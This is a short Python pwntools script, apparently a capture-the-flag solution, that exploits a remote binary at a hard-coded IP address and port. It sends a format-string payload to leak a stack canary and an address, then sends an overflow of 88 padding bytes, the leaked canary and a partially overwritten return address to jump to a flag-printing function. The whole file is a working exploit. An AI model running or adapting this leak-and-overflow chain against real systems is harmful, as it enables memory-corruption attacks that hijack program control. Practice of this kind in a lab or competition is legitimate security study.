from pwn import *
from Crypto.Util.number import long_to_bytes

# sh=process("./soal")

# sh=remote("localhost",13305)
sh = remote("104.248.150.36",13301)
# gdb.attach(sh,"""
# 	# b *0x401323
# 	""")

flag='1c5'

p = '%23$pEND%25$p'
sh.sendline(p)

sh.recvuntil("datang ")
leak=(sh.recvline()[:-1]).split("END")
print leak[0]
print leak[1]
flag= leak[1][-4] + flag
flag=long_to_bytes(int(flag,16))[::-1]

# flag = chr(int(flag[:2],16)) + chr(int(flag[2:],16))

p = 'a'*88
p+= p64(int(leak[0],16))
p+= p64(0)
p+= flag # print_flag

sh.send(p)

sh.interactive()